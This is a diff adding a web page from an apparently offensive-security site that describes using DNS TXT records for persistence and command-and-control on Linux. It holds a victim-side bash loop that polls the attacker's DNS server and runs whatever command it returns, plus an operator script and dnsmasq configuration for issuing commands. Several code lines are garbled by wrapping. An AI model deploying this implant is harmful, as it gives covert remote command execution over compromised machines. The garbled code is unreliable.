@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Technique - redttps</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" href="../favicon.png" type="image/png">
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #ffffff;
+      font-family: monospace;
+    }
+    .content-box {
+      border: 2px dashed #00ff00;
+      background-color: #1a1a1a;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- Header -->
+  <header class="w-full bg-black text-green-400 p-4 flex justify-between items-center shadow-md">
+    <h1 class="text-2xl font-bold glow-text">redttps</h1>
+    <nav class="space-x-4">
+      <a href="../index.html" class="hover:underline">Home</a>
+      <a href="../internals.html" class="hover:underline">Hunting</a>
+      <a href="../myself.html" class="hover:underline">Contact</a>
+    </nav>
+  </header>
+
+  <!-- Contenido de la técnica -->
+  <main class="flex-1 p-6">
+    <div class="content-box p-6 rounded-xl max-w-4xl mx-auto">
+      <h2 class="text-2xl font-bold glow-text mb-4">DNS as a channel for persistence and C2 (Linux)</h2>
+
+      <section class="mb-6">
+        <h3 class="text-xl font-semibold glow-text mb-2">Description</h3>
+        <p>
+This technique uses DNS queries to communicate with a remote server. The compromised system periodically queries a domain for TXT records, which contain encoded commands. After executing the command locally, the system may send results back via DNS or another channel. This method is stealthy because DNS traffic is often overlooked and considered benign<h3 class="text-xl font-semibold glow-text mb-2">Steps</h3>
+        <ol class="list-decimal list-inside space-y-2 break-words">
+        <li>Install dnsmasq</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+sudo apt install dnsmasq</pre>
+
+    <li>Create a file to simulate commands via DNS</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+sudo mkdir-p /var/lib/dns-c2 
+echo "whoami" > /var/lib/dns-c2/cmd.txt
+</pre>
+
+<li>Edit dnsmasq.conf temporary</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+sudo nano /etc/dnsmasq.d/dns-c2.conf
+</pre>
+
+<li>Add</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+address=/cmd.evil/127.0.0.1 
+txt-record=cmd.evil,"$(cat /var/lib/dns-c2/cmd.txt)"
+</pre>
+
+<li>Reboot dnsmasq</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+sudo systemctl restart dnsmasq
+</pre>
+
+<li>On the victim: Script to obtain command via DNS</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+#!/bin/bash
+ while true; do
+ cmd=$(dig +short TXT cmd.evil @192.168.11.129 | sed
+ 's/"//g')
+if [[ !-z "$cmd" ]]; then
+ echo "[*] Ejecutando comando recibido: $cmd"
+ bash-c "$cmd"
+ fi
+ sleep 30
+ done
+</pre>
+
+<li>Now on our machine, we create a file</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+#!/bin/bash
+ # Verificar que se pase al menos un parámetro (el
+ comando)
+ if [-z "$1" ]; then
+ echo "Uso: $0 'comando' [ruta_adicional]"
+ exit 1
+ fi
+ COMANDO="$1"
+ RUTA1="/var/lib/dns-c2/cmd.txt"
+ RUTA2="$2"
+ dns
+# Escribir comando en la ruta1
+ echo "$COMANDO" | sudo tee "$RUTA1" > /dev/null
+ # Si se pasa ruta2, también escribir el comando ahí
+ if [ !-z "$RUTA2" ]; then
+echo "$COMANDO" | sudo tee "$RUTA2" > /dev/null
+ fi
+ # Actualizar dnsmasq dinámicamente con el comando desde
+ la ruta1
+ echo "address=/cmd.evil/127.0.0.1" | sudo tee
+ /etc/dnsmasq.d/cmd.conf > /dev/null
+ echo "txt-record=cmd.evil,\"$(cat $RUTA1)\"" | sudo tee
+a /etc/dnsmasq.d/cmd.conf > /dev/null
+ # Reiniciar dnsmasq
+ sudo systemctl restart dnsmasq
+ echo "Comando actualizado en $RUTA1${RUTA2:+ y $RUTA2} y
+ dnsmasq reiniciado."
+</pre>
+
+<li>We can choose the command we want to execute</li>
+        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+ sudo ./dns-command.sh "uname -a"
+</pre>
+    </ol><br>
+<p>Reference: Created by Luis Rivera</p>
+      </section>
+    </div>
+  </main>
+
+</body>
+</html>
